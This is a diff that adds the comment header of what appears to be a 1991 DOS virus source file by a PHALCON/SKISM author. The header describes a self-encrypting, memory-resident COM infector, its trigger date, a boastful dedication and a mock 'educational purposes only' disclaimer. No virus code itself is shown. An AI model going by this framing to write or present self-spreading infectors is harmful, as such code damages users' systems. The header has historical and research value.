@@ -1,0 +1,32 @@
+; The Funky Bob Ross Virus Version 1.0
+; Written by Dark Angel / 26 September 1991 / (c) 1991
+; PHALCON/SKISM Co-op
+; Effective length: 1125, Resident length: 672 bytes
+;
+; DEDICATION:
+;   This virus was written expressedly to
+;      1) Piss off Patty Hoffman, John McAffee, Ross Greenberg, and all the
+;         other guru-wanna-bes in this world.
+;      2) Spread the message of The Almighty Bob, and so enrichen the lives
+;         of people all over the world.
+;      3) Show off (Now I can tell people that I wrote a virus!)
+;
+; WHAT THIS IS:
+;   This is a self-encrypting, non-overwriting COM infector.  It doesn't do
+;   anything to EXE files.  File sizes increase by 1117 bytes.  It goes off
+;   on July 9th of any year or after 7 infection "waves."
+;
+; WHAT IT DOES WHEN IT GOES OFF:
+;   The virus goes memory resident and prints out a Bobism every 5 minutes.
+;   It then enters a delay loop for approximately 5 seconds, allowing for a
+;   brief moment of silence while the victim reads Bob's holy message.  The
+;   virus will not destroy anything.  The virus will not go TSR if it finds
+;   another copy of itself in memory.
+;
+; CAUTION: THIS IS DESTRUCTIVE CODE.  YOU SHOULD NOT EVEN BE LOOKING AT IT.
+;          I HAVE NEVER AND WILL NEVER RELEASE THIS CODE.  IF YOU SHOULD BE
+;          LOOKING AT IT, IT IS BECAUSE IT WAS STOLEN FROM ME.  YOU HAVE NO
+;          RIGHT TO LOOK AT THIS CODE.  IF THIS SOURCE SHOULD FALL INTO THE
+;          WRONG HANDS, IT COULD BE VERY BAD!  DESTROY THIS IMMEDIATELY.  I
+;          HOLD NO RESPONSIBILITY FOR WHAT STUPID PEOPLE DO WITH THIS CODE.
+;          THIS WAS WRITTEN FOR EDUCATIONAL PURPOSES ONLY!!!
